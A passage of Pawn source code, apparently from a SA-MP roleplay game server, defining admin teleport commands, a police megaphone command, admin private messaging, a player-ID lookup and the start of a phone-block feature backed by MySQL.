			SendClientMessage(playerid, COLOR_GRAD1, "You have been teleported.");
			if(InHouse[playerid] > -1)
			{
			    StopAudioStreamForPlayer(playerid);
			}
			InHQ[playerid] = -1;
			InHouse[playerid] = -1;
			InBussines[playerid] = -1;
			SetPlayerVirtualWorld(playerid,0);
		}
		else
		{
			SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
		}
	}
	return 1;
}
CMD:gotojet(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
    {
		if (PlayerInfo[playerid][pAdmin] >= 2)
		{
			if (GetPlayerState(playerid) == 2)
			{
				new tmpcar = GetPlayerVehicleID(playerid);
				SetVehiclePos(tmpcar, 1.71875, 30.4062, 1200.34);
			}
			else
			{
				SetPlayerPosEx(playerid, 1.71875, 30.4062, 1200.34);
			}
			SetPlayerInterior(playerid,1);
			SendClientMessage(playerid, COLOR_GRAD1, "You have been teleported.");
			if(InHouse[playerid] > -1)
			{
   				StopAudioStreamForPlayer(playerid);
			}
			InHQ[playerid] = -1;
			InHouse[playerid] = -1;
			InBussines[playerid] = -1;
			SetPlayerVirtualWorld(playerid,0);
		}
		else
		{
			SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
		}
	}
	return 1;
}
CMD:so(playerid, params[])
{
    if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
    {
        if(IsACop(playerid))
        {
            if(SomatePermission[playerid] == 0) return SendClientMessage(playerid, COLOR_SERVER, "{3385FF}Wait 5 seconds to use again /so.");
            {
                new id,string[256];
                if(sscanf(params, "u", id)) return SendClientMessage(playerid, 0xFFFFFFFF, "{A9C4E4}Usage: {FFFFFF}/so <Name/Playerid>");
                {
                    if (!ProxDetectorS(40.0, playerid, id)) return SendClientMessage(playerid, COLOR_SERVER, "That player is too far from you.");
                    if(id != INVALID_PLAYER_ID)
                    {
                        new sendername[25],numelee[25];
                        GetPlayerName(id,numelee,sizeof(numelee));
                        GetPlayerName(playerid,sendername,sizeof(sendername));
                        if (GetPlayerState(id) == 2)
						{
						    new speed = Carspeed(id);
						    if(speed > 1)
						    {
								format(string, sizeof(string), "{FFFF00}(megaphone) Police %s: {1560BD}%s{FFFF00}, Shoma Taht Taghib Police Hastid!Taslim Shavid", sendername, numelee);
								ProxDetector(60.0, playerid, string,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW);
								somatee[playerid] = 0;
								SomatePermission[playerid] = 0;
								timersoo[playerid] = 5;
								somated[id] = playerid;
								format(somatename[id], 30, sendername);
								soexpire[playerid] = SetTimerEx("SomateExpire", 180000, 0, "i", id);
							}
							else if(speed == 0)
							{
							    if(PlayerInfo[id][pWantedLevel] == 0)
							    {
							    	format(string, sizeof(string), "{FFFF00}(megaphone) Police %s: bazikon,{1560BD}%s{FFFF00} taslim [/handsup] Shavid Va Dokme G ra bezanid", sendername, numelee);
									ProxDetector(60.0, playerid, string,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW);
									somatee[playerid] = 0;
									SomatePermission[playerid] = 0;
									somated[id] = playerid;
									timersoo[playerid] = 5;
									format(somatename[id], 30, sendername);
									soexpire[playerid] = SetTimerEx("SomateExpire", 180000, 0, "i", id);
								}
								else if(PlayerInfo[id][pWantedLevel] > 0)
								{
								    format(string, sizeof(string), "{FFFF00}(megaphone) Police %s: bazikon,{1560BD}%s{FFFF00} taslim [/handsup] Shavid Va Dokme G ra bezanid", sendername, numelee);
									ProxDetector(60.0, playerid, string,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW);
									somatee[playerid] = 0;
									SomatePermission[playerid] = 0;
									somated[id] = playerid;
									timersoo[playerid] = 5;
									format(somatename[id], 30, sendername);
									soexpire[playerid] = SetTimerEx("SomateExpire", 180000, 0, "i", id);
								}
							}
						}
						else
						{
							if(PlayerInfo[id][pWantedLevel] > 0)
							{
							    format(string, sizeof(string), "{FFFF00}(megaphone) Police %s: bazikon,{1560BD}%s{FFFF00} taslim [/handsup] Shavid Va Dokme G ra bezanid", sendername, numelee);
								ProxDetector(60.0, playerid, string,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW);
								somatee[playerid] = 0;
								SomatePermission[playerid] = 0;
								somated[id] = playerid;
								timersoo[playerid] = 5;
								format(somatename[id], 30, sendername);
								soexpire[playerid] = SetTimerEx("SomateExpire", 180000, 0, "i", id);
							}
							else if(PlayerInfo[id][pWantedLevel] == 0)
							{
							    format(string, sizeof(string), "{FFFF00}(megaphone) Police %s: bazikon,{1560BD}%s{FFFF00} taslim [/handsup] Shavid Va Dokme G ra bezanid!", sendername, numelee);
								ProxDetector(60.0, playerid, string,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW);
								somatee[playerid] = 0;
								SomatePermission[playerid] = 0;
								somated[id] = playerid;
								timersoo[playerid] = 5;
								format(somatename[id], 30, sendername);
								soexpire[playerid] = SetTimerEx("SomateExpire", 180000, 0, "i", id);
							}
						}
                    }
                    else return SendClientMessage(playerid, COLOR_SERVER, "Player not connected.");
				}
			}
		}
		else return SendClientMessage(playerid, COLOR_ERROR, "You are not a cop.");
	}
	return 1;
}	
CMD:goto(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pAdmin] >= 3)
	{
		new id,string[256],sendername[30],giveplayer[30];
		if(sscanf(params, "u", id)) return SendClientMessage(playerid, 0xFFFFFFFF, "{A9C4E4}Usage: {FFFFFF}/goto <Name/Playerid>");
        if(IsPlayerConnected(id))
		{
			if(id != INVALID_PLAYER_ID)
	        {
				new Float:ax,Float:ay,Float:az;
				GetPlayerPos(playerid,ax,ay,az);
				posxxx[playerid] = ax;
				posyyy[playerid] = ay;
				poszzz[playerid] = az;
				new Float:x, Float:y, Float:z;
				GetPlayerPos(id, x, y, z);
				new tmpcar = GetPlayerVehicleID(playerid);
				if (GetPlayerState(playerid) == 2)
				{
					SetVehiclePos(tmpcar, x, y+4, z);
				}
				else
				{
					SetPlayerPosEx(playerid,x,y+2, z);
					if(IsPlayerInAnyVehicle(id))
					{
						new vid = GetPlayerVehicleID(id);
						PutPlayerInVehicleEx(playerid, vid, 1);
					}
				}
				SetPlayerVirtualWorld(playerid, GetPlayerVirtualWorld(id));
				SetPlayerInterior(playerid, GetPlayerInterior(id));
				if(InHouse[id] > 0)
				{
					InHouse[playerid] = InHouse[id];
					if(strlen(housestring[InHouse[playerid]]) > 0)
					{
					    StopAudioStreamForPlayer(playerid);
						PlayAudioStreamForPlayer(playerid, housestring[InHouse[playerid]]);
					}
				}
				if(InHQ[id] > 0)
				{
					InHQ[playerid] = InHQ[id];
				}
				if(InBussines[id] > 0)
				{
					InBussines[playerid] = InBussines[id];
				}
				GetPlayerName(playerid,sendername,sizeof(sendername));
				GetPlayerName(id,giveplayer,sizeof(giveplayer));
				format(string,sizeof(string),"You have been teleported to %s.",giveplayer);
				SendClientMessage(playerid, COLOR_GRAD1, string);
				format(string,sizeof(string),"Admin %s teleported to you.",sendername);
				SendClientMessage(id, COLOR_GRAD1, string);
				format(string,sizeof(string),"[Admin-Warn]: {FFFFFF}%s used /goto on %s.",sendername,giveplayer);
				if(PlayerInfo[id][pAdmin] > 0 || PlayerInfo[id][pHelper] > 0)
				{
					ABroadCast(COLOR_AdminWarn,string,1);
				}
				printf("VW: %d", GetPlayerVirtualWorld(id));
    			Adminlog(string);
			}
			else return SendClientMessage(playerid, COLOR_SERVER, "{C1F589}Error: Player not connected.");
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_SERVER, "{5CAD5C}Error: Your admin/helper level isn't high enough to use this command.");
	}
	return 1;
}
CMD:goback(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pAdmin] >= 1 || PlayerInfo[playerid][pHelper] >= 1)
	{
	    if(posxxx[playerid] != 0)
	    {
	        SetPlayerPosEx(playerid,posxxx[playerid],posyyy[playerid],poszzz[playerid]);
	        SendClientMessage(playerid, COLOR_GRAD1, "You have been teleported.");
	 		return 1;
		}
		else return SendClientMessage(playerid, COLOR_SERVER, "You haven't go anywhere yet.");
	}
	else
	{
		SendClientMessage(playerid, COLOR_SERVER, "{5CAD5C}Error: Your admin/helper level isn't high enough to use this command.");
	}
	return 1;
}

CMD:gotols(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
	{
		if(PlayerInfo[playerid][pAdmin] >= 1 || PlayerInfo[playerid][pHelper] >= 1)
		{
			new string[100],sendername[30];
			if (GetPlayerState(playerid) == 2)
			{
				new tmpcar = GetPlayerVehicleID(playerid);
				SetVehiclePos(tmpcar, 1529.6,-1691.2,13.3);
				TelePos[playerid][0] = 0.0;TelePos[playerid][1] = 0.0;
			}
			else
			{
				SetPlayerPosEx(playerid, 1529.6,-1691.2,13.3);
			}
			SendClientMessage(playerid, COLOR_GRAD1, "You have been teleported.");
			SetPlayerInterior(playerid,0);
			PlayerInfo[playerid][pInt] = 0;
			GetPlayerName(playerid, sendername, sizeof(sendername));
			format(string, sizeof(string), "Warning: Admin %s Teleported to LS.", sendername);
			Adminlog(string);
			if(InHouse[playerid] > -1)
			{
				if(MP3ON[playerid] == 0) StopAudioStreamForPlayer(playerid);
			}
			InHQ[playerid] = -1;
			InHouse[playerid] = -1;
			InBussines[playerid] = -1;
			SetPlayerVirtualWorld(playerid,0);
		}
		else
		{
			SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
		}
	}
	return 1;
}
CMD:gotods(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
	{
		if(PlayerInfo[playerid][pAdmin] >= 2)
		{
			new string[100],sendername[30];
			if (GetPlayerState(playerid) == 2)
			{
				new tmpcar = GetPlayerVehicleID(playerid);
				SetVehiclePos(tmpcar, 1574.8773,-1274.0566,17.6131);
				TelePos[playerid][0] = 0.0;TelePos[playerid][1] = 0.0;
			}
			else
			{
				SetPlayerPosEx(playerid, 1574.8773,-1274.0566,17.6131);
			}
			SendClientMessage(playerid, COLOR_GRAD1, "You have been teleported to Dealership.");
			SetPlayerInterior(playerid,0);
			PlayerInfo[playerid][pInt] = 0;
			GetPlayerName(playerid, sendername, sizeof(sendername));
			format(string, sizeof(string), "Warning: Admin %s teleported to Dealership.", sendername);
			Adminlog(string);
			if(InHouse[playerid] > -1)
			{
   				if(MP3ON[playerid] == 0) StopAudioStreamForPlayer(playerid);
			}
			InHQ[playerid] = -1;
			InHouse[playerid] = -1;
			InBussines[playerid] = -1;
			SetPlayerVirtualWorld(playerid,0);
		}
		else
		{
			SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
		}
	}
	return 1;
}
CMD:gotojail(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
	{
		if(PlayerInfo[playerid][pAdmin] >= 1)
		{
			new string[100],sendername[30],jail[64];
			if(sscanf(params, "s[64]", jail)) return SCM(playerid,COLOR_SERVER,"{A9C4E4}Usage: {FFFFFF}/gotojail <ls/lv/admin>");
			if(strcmp(jail,"admin",true) == 0)
			{
				if (GetPlayerState(playerid) == 2)
				{
					new tmpcar = GetPlayerVehicleID(playerid);
					SetVehiclePos(tmpcar, 227.6104,114.6985,1000.0156);
					TelePos[playerid][0] = 0.0;TelePos[playerid][1] = 0.0;
				}
				else
				{
					SetPlayerPosEx(playerid, 227.6104,114.6985,1000.0156);
				}
				SendClientMessage(playerid, COLOR_GRAD1, "You have been teleported to Admin Jail.");
				SetPlayerInterior(playerid,10);
				PlayerInfo[playerid][pInt] = 10;
				GetPlayerName(playerid, sendername, sizeof(sendername));
				format(string, sizeof(string), "Warning: Admin %s teleported to Admin Jail.", sendername);
				Adminlog(string);
				if(InHouse[playerid] > -1)
				{
					if(MP3ON[playerid] == 0) StopAudioStreamForPlayer(playerid);
				}
				InHQ[playerid] = -1;
				InHouse[playerid] = -1;
				InBussines[playerid] = -1;
				SetPlayerVirtualWorld(playerid,0);
			}
			else if(strcmp(jail,"ls",true) == 0)
			{
				if (GetPlayerState(playerid) == 2)
				{
					new tmpcar = GetPlayerVehicleID(playerid);
					SetVehiclePos(tmpcar, 268.7461,76.8184,1001.0391);
					TelePos[playerid][0] = 0.0;TelePos[playerid][1] = 0.0;
				}
				else
				{
					SetPlayerPosEx(playerid, 268.7461,76.8184,1001.0391);
				}
				SendClientMessage(playerid, COLOR_GRAD1, "You have been teleported to LS Jail.");
				SetPlayerInterior(playerid,6);
				PlayerInfo[playerid][pInt] = 6;
				GetPlayerName(playerid, sendername, sizeof(sendername));
				format(string, sizeof(string), "Warning: Admin %s teleported to LS Jail.", sendername);
				Adminlog(string);
				if(InHouse[playerid] > -1)
				{
					if(MP3ON[playerid] == 0) StopAudioStreamForPlayer(playerid);
				}
				InHQ[playerid] = -1;
				InHouse[playerid] = -1;
				InBussines[playerid] = -1;
				SetPlayerVirtualWorld(playerid,0);
			}
			else if(strcmp(jail,"lv",true) == 0)
			{
				if (GetPlayerState(playerid) == 2)
				{
					new tmpcar = GetPlayerVehicleID(playerid);
					SetVehiclePos(tmpcar, 268.7461,76.8184,1001.0391);
					TelePos[playerid][0] = 0.0;TelePos[playerid][1] = 0.0;
				}
				else
				{
					SetPlayerPosEx(playerid, 268.7461,76.8184,1001.0391);
				}
				SendClientMessage(playerid, COLOR_GRAD1, "You have been teleported to LV Jail.");
				SetPlayerInterior(playerid,6);
				PlayerInfo[playerid][pInt] = 6;
				GetPlayerName(playerid, sendername, sizeof(sendername));
				format(string, sizeof(string), "Warning: Admin %s teleported to LV Jail.", sendername);
				Adminlog(string);
				if(InHouse[playerid] > -1)
				{
					if(MP3ON[playerid] == 0) StopAudioStreamForPlayer(playerid);
				}
				InHQ[playerid] = -1;
				InHouse[playerid] = -1;
				InBussines[playerid] = -1;
				SetPlayerVirtualWorld(playerid,3);
			}
		}
		else return SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
	}
	return 1;
}
CMD:mark(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
	{
		if (PlayerInfo[playerid][pAdmin] >= 2)
		{
			GetPlayerPos(playerid, TeleportDest[playerid][0],TeleportDest[playerid][1],TeleportDest[playerid][2]);
			SendClientMessage(playerid, COLOR_GRAD1, "Teleporter destination set.");
		}
		else
		{
			SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
		}
	}
	return 1;
}
CMD:gotom(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
    {
		new string[64],sendername[25];
		if(PlayerInfo[playerid][pAdmin] >= 1 || PlayerInfo[playerid][pHelper] >= 1)
		{
			if (GetPlayerState(playerid) == 2)
			{
				new tmpcar = GetPlayerVehicleID(playerid);
				SetVehiclePos(tmpcar, -2317.8091,-1637.5575,483.7031);
				TelePos[playerid][0] = 0.0;TelePos[playerid][1] = 0.0;
			}
			else
			{
				SetPlayerPosEx(playerid, -2317.8091,-1637.5575,483.7031);
			}
			SendClientMessage(playerid, COLOR_GRAD1, "You have been teleported.");
			SetPlayerInterior(playerid,0);
			PlayerInfo[playerid][pInt] = 0;
			GetPlayerName(playerid, sendername, sizeof(sendername));
			format(string, sizeof(string), "AdmWarning: Admin %s Teleported to Mountain.", sendername);
			Adminlog(string);
			if(InHouse[playerid] > -1)
			{
				if(MP3ON[playerid] == 0) StopAudioStreamForPlayer(playerid);
			}
			InHQ[playerid] = -1;
			InHouse[playerid] = -1;
			InBussines[playerid] = -1;
			SetPlayerVirtualWorld(playerid,0);
		}
		else
		{
			SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
		}
	}
	return 1;
}
CMD:gotocars(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
    {
		new string[64],sendername[25];
		if(PlayerInfo[playerid][pAdmin] >= 1 || PlayerInfo[playerid][pHelper] >= 1)
		{
			SetPlayerPosEx(playerid, 1267.663208,-781.323242,1091.906250);
			SendClientMessage(playerid, COLOR_GRAD1, "You have been teleported.");
			SetPlayerInterior(playerid,5);
			PlayerInfo[playerid][pInt] = 5;
			GetPlayerName(playerid, sendername, sizeof(sendername));
			format(string, sizeof(string), "AdmWarning: Admin %s Teleported to Cars.", sendername);
			Adminlog(string);
			if(MP3ON[playerid] == 0) StopAudioStreamForPlayer(playerid);
			InHQ[playerid] = -1;
			InHouse[playerid] = -1;
			InBussines[playerid] = -1;
			SetPlayerVirtualWorld(playerid,696969);
		}
		else
		{
			SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
		}
	}
	return 1;
}
CMD:gotomark(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
    {
		new string[64],sendername[25];
		if (PlayerInfo[playerid][pAdmin] >= 2)
		{
			if (GetPlayerState(playerid) == 2)
			{
				new tmpcar = GetPlayerVehicleID(playerid);
				SetVehiclePos(tmpcar, TeleportDest[playerid][0],TeleportDest[playerid][1],TeleportDest[playerid][2]);
				TelePos[playerid][0] = 0.0;TelePos[playerid][1] = 0.0;
			}
			else
			{
				SetPlayerPosEx(playerid, TeleportDest[playerid][0],TeleportDest[playerid][1],TeleportDest[playerid][2]);
			}
			SendClientMessage(playerid, COLOR_GRAD1, "You have been teleported.");
			SetPlayerInterior(playerid,0);
			GetPlayerName(playerid, sendername, sizeof(sendername));
			format(string, sizeof(string), "AdmWarning: Admin %s Teleported to Mark.", sendername);
			Adminlog(string);
		}
		else
		{
			SendClientMessage(playerid, COLOR_SERVER, "{5CAD5C}Error: Your admin level isn't high enough to use this command.");
		}
	}
	return 1;
}
CMD:gotoin(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
    {
		if (PlayerInfo[playerid][pAdmin] >= 1 || PlayerInfo[playerid][pHelper] >= 1)
		{
			if (GetPlayerState(playerid) == 2)
			{
				new tmpcar = GetPlayerVehicleID(playerid);
				SetVehiclePos(tmpcar, 1416.107000,0.268620,1000.926000);
			}
			else
			{
				SetPlayerPosEx(playerid, 1416.107000,0.268620,1000.926000);
			}
			new string[64],sendername[25];
			SendClientMessage(playerid, COLOR_GRAD1, "You have been teleported.");
			SetPlayerInterior(playerid,1);
			GetPlayerName(playerid, sendername, sizeof(sendername));
			format(string, sizeof(string), "AdmWarning: Admin %s Teleported to In.", sendername);
			Adminlog(string);
			if(InHouse[playerid] > -1)
			{
			    if(MP3ON[playerid] == 0) StopAudioStreamForPlayer(playerid);
			}
			InHQ[playerid] = -1;
			InHouse[playerid] = -1;
			InBussines[playerid] = -1;
			SetPlayerVirtualWorld(playerid,0);
		}
		else
		{
			SendClientMessage(playerid, COLOR_SERVER,"{5CAD5C}Error: Your admin/helper level isn't high enough to use this command.");
		}
	}
	return 1;
}
CMD:gotocar(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
	{
		if (PlayerInfo[playerid][pAdmin] >= 1)
	  	{
			new testcar,string[128],sendername[30];
			if(sscanf(params, "d",testcar)) return SendClientMessage(playerid, 0xFFFFFFFF, "{A9C4E4}Usage: {FFFFFF}/gotocar <Car ID>");
			new Float:cwx2,Float:cwy2,Float:cwz2;
			GetVehiclePos(testcar, cwx2, cwy2, cwz2);
			if (GetPlayerState(playerid) == 2)
			{
				new tmpcar = GetPlayerVehicleID(playerid);
				SetVehiclePos(tmpcar, cwx2, cwy2, cwz2);
				TelePos[playerid][0] = 0.0;TelePos[playerid][1] = 0.0;
			}
			else
			{
				SetPlayerPosEx(playerid, cwx2, cwy2, cwz2);
			}
			SendClientMessage(playerid, COLOR_GRAD1, "You have been teleported.");
			SetPlayerInterior(playerid,0);
			GetPlayerName(playerid, sendername, sizeof(sendername));
			format(string, sizeof(string), "Warning: Admin %s Teleported to Gotocar.", sendername);
			Adminlog(string);
			if(InHouse[playerid] > -1)
			{
			    if(MP3ON[playerid] == 0) StopAudioStreamForPlayer(playerid);
			}
			InHQ[playerid] = -1;
			InHouse[playerid] = -1;
			InBussines[playerid] = -1;
			SetPlayerVirtualWorld(playerid,0);
		}
		else
		{
			SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
		}
	}
	return 1;
}
CMD:check(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
 	{
		if (PlayerInfo[playerid][pAdmin] >= 1 || PlayerInfo[playerid][pHelper] >= 1)
		{
			new id;
			if(sscanf(params, "u",id)) return SendClientMessage(playerid, 0xFFFFFFFF, "{A9C4E4}Usage: {FFFFFF}/check <Name/Playerid>");
			if(IsPlayerConnected(id))
			{
				if(id != INVALID_PLAYER_ID)
				{
					ShowStats(playerid,id);
				}
			}
			else return SendClientMessage(playerid, COLOR_SERVER, "{C1F589}Error: Player not connected.");
		}
		else return SendClientMessage(playerid, COLOR_SERVER, "{5CAD5C}Error: Your admin/helper level isn't high enough to use this command.");
	}
	return 1;
}
CMD:pm(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	new id,message[128], string[256], sendername[25], giveplayer[25];
	if(PlayerInfo[playerid][pAdmin] >= 1 || PlayerInfo[playerid][pHelper] >= 1)
	{
		if(sscanf(params, "us[128]", id, message)) return SendClientMessage(playerid, 0xFFFFFFFF,"{A9C4E4}Usage: {FFFFFF}/pm <Name/Playerid> <Message>");
		{
			if(id != INVALID_PLAYER_ID)
	        {
				GetPlayerName(playerid, sendername, sizeof(sendername));
				GetPlayerName(id, giveplayer, sizeof(giveplayer));
				format(string, sizeof(string), "{F6FF00}PM from %s: %s", sendername, message);
				SendClientMessage(id, COLOR_YELLOW, string);
				format(string, sizeof(string), "{F6FF00}PM sent to %s: %s", giveplayer , message);
				SendClientMessage(playerid,  COLOR_YELLOW, string);
			}
			else return SendClientMessage(playerid, COLOR_SERVER, "{C1F589}Error: Player not connected.");
		}
	}
	else return SendClientMessage(playerid, COLOR_SERVER, "{5CAD5C}Error: Your admin/helper level isn't high enough to use this command.");
	return 1;
}
CMD:id(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SCM(playerid, COLOR_ERROR, "Please login server!");
	if(IsPlayerConnected(playerid))
	{
		new id[30], giveplayer[150], sstring[1000], name[30], find=0, idd;
		if(sscanf(params, "s[30]", id)) return SendClientMessage(playerid, 0xFFFFFFFF,"{A9C4E4}Usage: {FFFFFF}/id <Name/Playerid>");
		{
			if(IsNumeric(id))
			{
				idd = strval(id);
				if(IsPlayerConnected(idd))
				{
					if(idd != INVALID_PLAYER_ID)
					{
							if(PlayerInfo[idd][pClanTag] == 0)
							{
								format(giveplayer, sizeof(giveplayer),"%s", PlayerInfo[idd][pNormalName]);
							}
							if(PlayerInfo[idd][pClanTag] == 1)
							{
								format(giveplayer, sizeof(giveplayer),"{FFFF00}%s{FFFFFF}%s", ClanInfo[PlayerInfo[idd][pClan]][cClanTag], PlayerInfo[idd][pNormalName]);
							}
							if(PlayerInfo[idd][pClanTag] == 2)
							{
								format(giveplayer, sizeof(giveplayer),"%s{FFFF00}%s{FFFFFF}", PlayerInfo[idd][pNormalName], ClanInfo[PlayerInfo[idd][pClan]][cClanTag]);
							}
							if(PlayerInfo[idd][pRank] > 0 || botmember[idd] > 0 && botmember[idd] < 16)
							{
								format(sstring, sizeof(sstring), "(%d) %s | Level: %d | Faction: %s (rank %d).",idd,giveplayer,PlayerInfo[idd][pLevel],NumeFactiune(PlayerInfo[idd][pMember]),PlayerInfo[idd][pRank]);
								SendClientMessage(playerid, COLOR_SERVER, sstring);
				
							}
							else
							{
								format(sstring, sizeof(sstring), "(%d) %s | Level: %d | Faction: None.",idd, giveplayer,PlayerInfo[idd][pLevel]);
								SendClientMessage(playerid, COLOR_SERVER, sstring);
							}
					}
				}
				else return SendClientMessage(playerid, COLOR_SERVER, "Player not connected.");
			}
			else
			{
				for(new i = 0; i < MAX_PLAYERS; i++)
				{
					if(IsPlayerConnected(i))
					{
						if(find < 10)
						{
							GetPlayerName(i, name, sizeof(name));
							if(strfind(name, id, true) != -1)
							{
									if(PlayerInfo[i][pClanTag] == 0)
									{
										format(giveplayer, sizeof(giveplayer),"%s", PlayerInfo[i][pNormalName]);
									}
									if(PlayerInfo[i][pClanTag] == 1)
									{
										format(giveplayer, sizeof(giveplayer),"{FFFF00}%s{FFFFFF}%s", ClanInfo[PlayerInfo[i][pClan]][cClanTag], PlayerInfo[i][pNormalName]);
									}
									if(PlayerInfo[i][pClanTag] == 2)
									{
										format(giveplayer, sizeof(giveplayer),"%s{FFFF00}%s{FFFFFF}", PlayerInfo[i][pNormalName], ClanInfo[PlayerInfo[i][pClan]][cClanTag]);
									}
									if(PlayerInfo[i][pRank] > 0 || botmember[i] > 0)
									{
										format(sstring, sizeof(sstring), "(%d) %s | Level: %d | Faction: %s (rank %d).",i,giveplayer,PlayerInfo[i][pLevel],NumeFactiune(PlayerInfo[i][pMember]),PlayerInfo[i][pRank]);
										SendClientMessage(playerid, COLOR_SERVER, sstring);
									}
									else
									{
										format(sstring, sizeof(sstring), "(%d) %s | Level: %d | Faction: None.",i,giveplayer,PlayerInfo[i][pLevel]);
										SendClientMessage(playerid, COLOR_SERVER, sstring);
									}
									find ++;
							}
						}
					}
				}
				if(find == 0) return SendClientMessage(playerid, COLOR_SERVER, "Player not connected.");
			}
		}
	}
	return 1;
}
CMD:pblock(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
	{
	    new playername3[MAX_PLAYER_NAME];
     	GetPlayerName(playerid,playername3,sizeof(playername3));
	    if(PlayerInfo[playerid][pPhoneBlock] == 1)
	    {
			new id, string[256];
			if(sscanf(params, "u", id)) return SendClientMessage(playerid, 0xFFFFFFFF,"{A9C4E4}Usage: {FFFFFF}/pblock <Name/ID>");
			{
	            if(IsPlayerConnected(id))
	            {
					if(id != INVALID_PLAYER_ID)
					{
					    if(BlockPhone[playerid][bpNume1] != PlayerInfo[id][pNormalName] &&
						 	BlockPhone[playerid][bpNume2] != PlayerInfo[id][pNormalName] &&
						 	BlockPhone[playerid][bpNume3] != PlayerInfo[id][pNormalName] &&
						 	BlockPhone[playerid][bpNume4] != PlayerInfo[id][pNormalName] &&
						 	BlockPhone[playerid][bpNume5] != PlayerInfo[id][pNormalName] &&
						 	BlockPhone[playerid][bpNume6] != PlayerInfo[id][pNormalName] &&
						 	BlockPhone[playerid][bpNume7] != PlayerInfo[id][pNormalName] &&
						 	BlockPhone[playerid][bpNume8] != PlayerInfo[id][pNormalName] &&
						 	BlockPhone[playerid][bpNume9] != PlayerInfo[id][pNormalName] &&
						 	BlockPhone[playerid][bpNume10] != PlayerInfo[id][pNormalName])
						{
						    new playername[MAX_PLAYER_NAME];
		    				GetPlayerName(id,playername,sizeof(playername));
							if(BlockPhone[playerid][bpNumar1] == 0)
							{
								format(string, sizeof(string), "* You added the %s in CloudPhone the Block. To unlock write command [/unblock].", playername);
								SCM(playerid, COLOR_LIGHTBLUE, string);
	                            BlockPhone[playerid][bpNumar1] = 1;

	                            new var[256];
	                            mysql_format(SQL, var, sizeof(var), "UPDATE `blocklist` SET `Nume1`='%s', `Numar1`='%d' WHERE `Name`='%s'",playername, BlockPhone[playerid][bpNumar1],playername3);
								mysql_tquery(SQL,var,"","");
							}
							else if(BlockPhone[playerid][bpNumar2] == 0)
							{
							    format(string, sizeof(string), "* You added the %s in CloudPhone the Block. To unlock write command [/unblock].", playername);
								SCM(playerid, COLOR_LIGHTBLUE, string);
							    BlockPhone[playerid][bpNumar2] = 1;

							    new var[256];
	                            mysql_format(SQL, var, sizeof(var), "UPDATE `blocklist` SET `Nume2`='%s', `Numar2`='%d' WHERE `Name`='%s'",playername, BlockPhone[playerid][bpNumar2],playername3);
								mysql_tquery(SQL,var,"","");
							}
							else if(BlockPhone[playerid][bpNumar3] == 0)
							{
							    format(string, sizeof(string), "* You added the %s in CloudPhone the Block. To unlock write command [/unblock].", playername);
								SCM(playerid, COLOR_LIGHTBLUE, string);
							    BlockPhone[playerid][bpNumar3] = 1;

							    new var[256];
	                            mysql_format(SQL, var, sizeof(var), "UPDATE `blocklist` SET `Nume3`='%s', `Numar3`='%d' WHERE `Name`='%s'",playername, BlockPhone[playerid][bpNumar3],playername3);
								mysql_tquery(SQL,var,"","");
							}
							else if(BlockPhone[playerid][bpNumar4] == 0)
							{
							    format(string, sizeof(string), "* You added the %s in CloudPhone the Block. To unlock write command [/unblock].", playername);
								SCM(playerid, COLOR_LIGHTBLUE, string);
